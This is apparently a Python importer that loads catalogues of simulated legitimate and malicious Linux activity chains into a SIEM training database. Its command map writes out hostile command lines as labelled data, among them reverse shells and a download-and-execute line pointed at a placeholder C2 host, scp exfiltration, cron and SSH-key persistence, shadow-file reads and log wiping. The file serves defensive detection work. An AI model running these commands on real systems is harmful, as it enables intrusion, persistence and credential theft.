from __future__ import annotations

import json
import re
from pathlib import Path

import yaml

from .activity_chains_repo import upsert_chain
from ..activity_chain import ChainLog, derive_chain_legitimacy
from .connection import get_connection, init_schema

_DELTA = re.compile(r"^\+?(\d+)(s|m|h)$", re.I)

# Referencias abstractas del catálogo → comando simulado (sin payloads operativos reales)
CMD_REF_MAP: dict[str, dict[str, str]] = {
    "cmd_systemctl_status_service": {
        "command_line": "systemctl status nginx",
        "legitimacy": "legitimate",
        "category": "admin",
        "description": "Consulta estado de servicio",
    },
    "cmd_systemctl_restart_service": {
        "command_line": "sudo systemctl restart nginx",
        "legitimacy": "legitimate",
        "category": "admin",
        "description": "Reinicio controlado de servicio",
    },
    "cmd_apt_update": {
        "command_line": "apt-get update",
        "legitimacy": "legitimate",
        "category": "package",
        "description": "Actualización de índices APT",
    },
    "cmd_apt_install_known_package": {
        "command_line": "apt install -y nginx",
        "legitimacy": "legitimate",
        "category": "package",
        "description": "Instalación de paquete aprobado",
    },
    "cmd_backup_tar_normal": {
        "command_line": "tar -czf /tmp/backup-etc.tar.gz /etc/nginx",
        "legitimacy": "legitimate",
        "category": "backup",
        "description": "Backup comprimido programado",
    },
    "cmd_rsync_backup_normal": {
        "command_line": "rsync -av /var/www/ /backup/www/",
        "legitimacy": "legitimate",
        "category": "backup",
        "description": "Sincronización de backup",
    },
    "cmd_journalctl_service": {
        "command_line": "journalctl -u nginx --since today",
        "legitimacy": "legitimate",
        "category": "admin",
        "description": "Logs de servicio vía journalctl",
    },
    "cmd_tail_log_file": {
        "command_line": "tail -n 50 /var/log/auth.log",
        "legitimacy": "legitimate",
        "category": "admin",
        "description": "Lectura de log reciente",
    },
    "cmd_ip_addr_show": {
        "command_line": "ip addr show",
        "legitimacy": "legitimate",
        "category": "network",
        "description": "Inventario de interfaces",
    },
    "cmd_ss_listening_ports": {
        "command_line": "ss -tulpn",
        "legitimacy": "legitimate",
        "category": "network",
        "description": "Puertos en escucha",
    },
    "cmd_ps_process_review": {
        "command_line": "ps aux --sort=-%cpu | head -n 10",
        "legitimacy": "legitimate",
        "category": "admin",
        "description": "Revisión de procesos",
    },
    "cmd_docker_ps": {
        "command_line": "docker ps -a",
        "legitimacy": "legitimate",
        "category": "container",
        "description": "Listado de contenedores",
    },
    "cmd_docker_logs": {
        "command_line": "docker logs --tail 50 web-app",
        "legitimacy": "legitimate",
        "category": "container",
        "description": "Logs de contenedor",
    },
    "cmd_clear_auth_logs": {
        "command_line": "truncate -s 0 /var/log/auth.log",
        "legitimacy": "illegitimate",
        "category": "log-tampering",
        "description": "Truncado de auth.log (simulado)",
    },
    "cmd_clear_bash_history": {
        "command_line": "history -c",
        "legitimacy": "illegitimate",
        "category": "defense-evasion",
        "description": "Limpieza de historial shell",
    },
    "cmd_disable_history_logging": {
        "command_line": "unset HISTFILE",
        "legitimacy": "illegitimate",
        "category": "defense-evasion",
        "description": "Desactivar historial",
    },
    "cmd_download_tmp_execute": {
        "command_line": "curl -fsSL http://{c2_domain}/stage.sh -o /tmp/stage && chmod +x /tmp/stage && /tmp/stage",
        "legitimacy": "illegitimate",
        "category": "download-execute",
        "description": "Descarga y ejecución desde /tmp",
    },
    "cmd_nohup_suspicious_binary": {
        "command_line": "nohup /tmp/stage >/dev/null 2>&1 &",
        "legitimacy": "illegitimate",
        "category": "execution",
        "description": "Proceso desacoplado en background",
    },
    "cmd_reverse_shell_bash_pattern": {
        "command_line": "bash -c 'bash -i >& /dev/tcp/{c2_ip}/4444 0>&1'",
        "legitimacy": "illegitimate",
        "category": "reverse-shell",
        "description": "Patrón shell inversa (simulado)",
    },
    "cmd_reverse_shell_netcat_pattern": {
        "command_line": "nc -e /bin/sh {c2_ip} 4444",
        "legitimacy": "illegitimate",
        "category": "reverse-shell",
        "description": "Patrón netcat (simulado)",
    },
    "cmd_python_reverse_shell_pattern": {
        "command_line": "python3 -c 'import socket,subprocess,os'",
        "legitimacy": "illegitimate",
        "category": "reverse-shell",
        "description": "Patrón python reverse (simulado)",
    },
    "cmd_crontab_list": {
        "command_line": "crontab -l",
        "legitimacy": "illegitimate",
        "category": "discovery",
        "description": "Enumeración de cron",
    },
    "cmd_cron_persistence": {
        "command_line": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/task') | crontab -",
        "legitimacy": "illegitimate",
        "category": "persistence",
        "description": "Persistencia vía cron",
    },
    "cmd_systemd_persistence": {
        "command_line": "systemctl enable --now suspicious.service",
        "legitimacy": "illegitimate",
        "category": "persistence",
        "description": "Servicio systemd sospechoso",
    },
    "cmd_create_unexpected_user": {
        "command_line": "useradd -m -s /bin/bash deploy",
        "legitimacy": "illegitimate",
        "category": "persistence",
        "description": "Creación de usuario local",
    },
    "cmd_add_user_to_sudo": {
        "command_line": "usermod -aG sudo deploy",
        "legitimacy": "illegitimate",
        "category": "privilege-escalation",
        "description": "Usuario añadido a sudo",
    },
    "cmd_add_ssh_authorized_key": {
        "command_line": "echo 'ssh-rsa AAAAB3... backdoor' >> ~/.ssh/authorized_keys",
        "legitimacy": "illegitimate",
        "category": "persistence",
        "description": "Clave SSH autorizada añadida",
    },
    "cmd_local_account_discovery": {
        "command_line": "cat /etc/passwd",
        "legitimacy": "illegitimate",
        "category": "discovery",
        "description": "Enumeración de cuentas locales",
    },
    "cmd_read_shadow": {
        "command_line": "cat /etc/shadow",
        "legitimacy": "illegitimate",
        "category": "credential-access",
        "description": "Lectura de shadow",
    },
    "cmd_search_credentials_files": {
        "command_line": "grep -r password /var/www/ 2>/dev/null",
        "legitimacy": "illegitimate",
        "category": "credential-access",
        "description": "Búsqueda de credenciales",
    },
    "cmd_read_shell_history": {
        "command_line": "cat ~/.bash_history",
        "legitimacy": "illegitimate",
        "category": "discovery",
        "description": "Lectura de historial",
    },
    "cmd_archive_sensitive_data": {
        "command_line": "tar -czf /tmp/archive.tgz /etc",
        "legitimacy": "illegitimate",
        "category": "collection",
        "description": "Archivo de datos sensibles",
    },
    "cmd_external_scp_transfer": {
        "command_line": "scp /tmp/archive.tgz user@{c2_ip}:/loot/",
        "legitimacy": "illegitimate",
        "category": "exfiltration",
        "description": "Transferencia SCP externa",
    },
    "cmd_stop_auditd": {
        "command_line": "systemctl stop auditd",
        "legitimacy": "illegitimate",
        "category": "defense-evasion",
        "description": "Parada de auditd",
    },
    "cmd_disable_firewall": {
        "command_line": "iptables -F",
        "legitimacy": "illegitimate",
        "category": "defense-evasion",
        "description": "Vaciado de firewall",
    },
    "cmd_docker_privileged_host_mount": {
        "command_line": "docker run --privileged -v /:/host suspicious:latest",
        "legitimacy": "illegitimate",
        "category": "container",
        "description": "Contenedor privilegiado con montaje host",
    },
    "cmd_chmod_world_writable_sensitive": {
        "command_line": "chmod 777 /etc/passwd",
        "legitimacy": "illegitimate",
        "category": "privilege-escalation",
        "description": "Permisos inseguros en ruta sensible",
    },
    "cmd_change_ownership_sensitive": {
        "command_line": "chown www-data:www-data /etc/shadow",
        "legitimacy": "illegitimate",
        "category": "privilege-escalation",
        "description": "Cambio de propietario en archivo crítico",
    },
    "cmd_webshell_like_execution": {
        "command_line": "php -r 'system($_GET[\"cmd\"]);'",
        "legitimacy": "illegitimate",
        "category": "web-exec",
        "description": "Ejecución inline tipo webshell (simulado)",
    },
    "cmd_ssh_reverse_tunnel": {
        "command_line": "ssh -R 8080:localhost:22 attacker@{c2_ip}",
        "legitimacy": "illegitimate",
        "category": "tunneling",
        "description": "Túnel SSH reverso",
    },
    "cmd_socat_tunnel_pattern": {
        "command_line": "socat TCP-LISTEN:4444,fork TCP:{c2_ip}:443",
        "legitimacy": "illegitimate",
        "category": "tunneling",
        "description": "Patrón de túnel socat",
    },
}

_DEFAULT_EVENT_LEGIT = "linux_auth_sudo_command"
_DEFAULT_EVENT_ILLEGIT = "linux_audit_execve"
_DEFAULT_EVENT_CMD_ONLY_LEGIT = "linux_auth_sudo_command"
_DEFAULT_EVENT_CMD_ONLY_ILLEGIT = "linux_process_temp_execution"


def _parse_delta_ms(raw: str) -> int:
    text = str(raw or "0s").strip().lower()
    if text in {"0", "0s"}:
        return 0
    m = _DELTA.match(text)
    if not m:
        return 0
    n = int(m.group(1))
    unit = m.group(2).lower()
    if unit == "s":
        return n * 1000
    if unit == "m":
        return n * 60_000
    if unit == "h":
        return n * 3_600_000
    return 0


def _resolve_event_id(event_ref: str) -> str:
    ref = str(event_ref or "").strip()
    if not ref:
        return ""
    if ref.startswith("linux_"):
        return ref
    return f"linux_{ref}"


def _legitimacy_value(raw: str) -> str:
    val = str(raw or "").strip().lower()
    if val in {"legit", "legitimate", "legal"}:
        return "legitimate"
    return "illegitimate"


def _resolve_command(ref: str) -> tuple[str, str]:
    meta = CMD_REF_MAP.get(ref, {})
    return meta.get("command_line", ref.replace("cmd_", "").replace("_", " ")), meta.get("legitimacy", "")


def _import_command_refs(conn) -> int:
    n = 0
    for ref_id, meta in CMD_REF_MAP.items():
        conn.execute(
            """
            INSERT INTO command_refs (id, command_line, legitimacy, category, description)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET
                command_line=excluded.command_line,
                legitimacy=excluded.legitimacy,
                category=excluded.category,
                description=excluded.description
            """,
            (
                ref_id,
                meta["command_line"],
                meta["legitimacy"],
                meta.get("category", ""),
                meta.get("description", ""),
            ),
        )
        n += 1
    return n


def _parse_chain_file(path: Path, root_key: str) -> list[dict]:
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    root = (data or {}).get(root_key) or {}
    return list(root.get("cadenas") or [])


def _chain_steps_from_yaml(steps_raw: list, legitimacy: str) -> list[dict]:
    out: list[dict] = []
    prev_delay = 0
    for idx, step in enumerate(steps_raw):
        if not isinstance(step, dict):
            continue
        delay = _parse_delta_ms(step.get("delta_sugerido", "0s"))
        min_delay = max(0, delay - prev_delay) if idx else 0
        prev_delay = delay
        event_ref = str(step.get("event_ref") or "").strip()
        command_ref = str(step.get("command_ref") or "").strip()
        command_line = ""
        cmd_leg = ""
        step_kind = "event"
        event_id = _resolve_event_id(event_ref) if event_ref else ""

        if command_ref:
            command_line, cmd_leg = _resolve_command(command_ref)
            if not event_id:
                step_kind = "command"
                event_id = (
                    _DEFAULT_EVENT_CMD_ONLY_LEGIT
                    if legitimacy == "legitimate"
                    else _DEFAULT_EVENT_CMD_ONLY_ILLEGIT
                )
            elif "sudo" in event_id or "auth_sudo" in event_id:
                step_kind = "event"
        else:
            cmd_leg = ""

        if not event_id and not command_ref:
            continue

        step_leg = cmd_leg if command_ref and cmd_leg else legitimacy

        out.append({
            "sort_order": int(step.get("orden", len(out) + 1)),
            "step_kind": step_kind,
            "event_id": event_id,
            "command_ref": command_ref,
            "command_line": command_line,
            "min_delay_ms": min_delay,
            "max_delay_ms": min_delay + max(500, min_delay // 10),
            "optional": bool(step.get("opcional")),
            "legitimacy": step_leg,
        })
    return out


def import_chain_yaml(path: Path, *, root_key: str, conn) -> list[str]:
    imported: list[str] = []
    for chain in _parse_chain_file(path, root_key):
        cid = str(chain.get("id", "")).strip()
        if not cid:
            continue
        legitimacy = _legitimacy_value(chain.get("legitimidad", "legit"))
        mitre = chain.get("mitre_contextual") or chain.get("mitre") or []
        meta = {
            "id": cid,
            "name": str(chain.get("nombre", cid)),
            "legitimacy": legitimacy,
            "category": str(chain.get("categoria", "")),
            "severity": str(chain.get("severidad_sugerida", "info")),
            "description": str(chain.get("objetivo_simulado", "")),
            "objective": str(chain.get("objetivo_simulado", "")),
            "source_system": "linux",
            "mitre": [str(t) for t in mitre if str(t).strip()],
        }
        steps = _chain_steps_from_yaml(chain.get("eventos_en_orden") or [], legitimacy)
        log_objs = [
            ChainLog(
                sort_order=int(s["sort_order"]),
                event_id=s["event_id"],
                command_line=s.get("command_line", ""),
                legitimacy=s.get("legitimacy", legitimacy),
            )
            for s in steps
        ]
        meta["legitimacy"] = derive_chain_legitimacy(log_objs, legitimacy)
        upsert_chain(conn, meta, steps)
        imported.append(cid)
    return imported


def import_activity_chains(
    base: Path | None = None,
    db_path: Path | None = None,
) -> dict[str, int | list[str]]:
    base = base or Path(__file__).resolve().parents[3] / "config"
    legit_path = base / "catalogo_cadenas_legitimas.yaml"
    illegit_path = base / "catalogo_cadenas_ilegitimas.yaml"
    conn = get_connection(db_path)
    init_schema(conn)
    try:
        refs = _import_command_refs(conn)
        legit_ids = import_chain_yaml(legit_path, root_key="catalogo_cadenas_legitimas", conn=conn) if legit_path.exists() else []
        illegit_ids = import_chain_yaml(illegit_path, root_key="catalogo_cadenas_ilegitimas", conn=conn) if illegit_path.exists() else []
        conn.commit()
        total = conn.execute("SELECT COUNT(*) AS n FROM activity_chains").fetchone()["n"]
        steps = conn.execute("SELECT COUNT(*) AS n FROM activity_chain_steps").fetchone()["n"]
    finally:
        conn.close()
    return {
        "command_refs": refs,
        "legitimate_chains": len(legit_ids),
        "illegitimate_chains": len(illegit_ids),
        "chains_total": total,
        "steps_total": steps,
        "ids": legit_ids + illegit_ids,
    }


def main(argv: list[str] | None = None) -> int:
    import argparse

    p = argparse.ArgumentParser(description="Import Linux activity chain YAML into fortisiem.db")
    p.add_argument("--config-dir", type=Path, default=None)
    p.add_argument("--db", type=Path, default=None)
    args = p.parse_args(argv)
    result = import_activity_chains(args.config_dir, args.db)
    print(json.dumps({k: v for k, v in result.items() if k != "ids"}, indent=2))
    print(f"ids: {len(result['ids'])} cadenas")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
